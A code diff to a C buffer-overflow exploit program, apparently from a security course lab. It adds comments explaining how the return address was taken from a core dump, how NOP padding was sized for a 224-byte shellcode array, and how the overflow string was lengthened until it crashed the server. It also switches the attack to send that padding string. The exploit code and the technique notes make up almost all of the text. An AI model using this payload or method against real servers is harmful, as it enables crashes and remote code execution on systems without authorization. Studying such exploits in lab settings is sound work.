@@ -95,6 +95,12 @@ void  DoAttack(int portNo) {
     return;
 }
 
+// The length was calculated by counting the number of characters in the comprimise1 array.
+// The bulk of the hex values are the exact same as the selfcomp.c, but the return address was calculated 
+// using the stack pointer found in the client core dump, we subtracted 208 from that to get the correct 
+// address to place in the return address section of the array. The only other difference was the number
+// of no-ops instructions, where we took the length of the code without the nops, and subtracted that 
+// from the length (224). In this case it was 69. This was validated by adding another one, which gave us an error
 char compromise[224]={
  0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
  0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
@@ -150,6 +156,10 @@ char compromise[224]={
 
 };
 
+// This is the array that was used to initially comprimise the server. While initially, 193 x's before the MNOPWXYZ produced,
+// However, trying to use 209 as the length of the comprimise 1 array did not produce the 139 return code on the server. To do
+// this, we added x's until the hex value of MNOPWXYZ showed up in the stack pointer. This was 224 total characters, and with 
+// this amount, using comprimise returned code of 139 on the server
 char * compromise1=
     "xxxxxxxxxxxxxxxxxxxx" // 20
     "xxxxxxxxxxxxxxxxxxxx"
@@ -167,7 +177,7 @@ char * compromise1=
 
 // change to write so we can write NULLs
 void Attack(FILE * outfile){
-    fprintf(outfile, "%s", compromise);  
+    fprintf(outfile, "%s", compromise1);  
     fflush(outfile);
 }
 
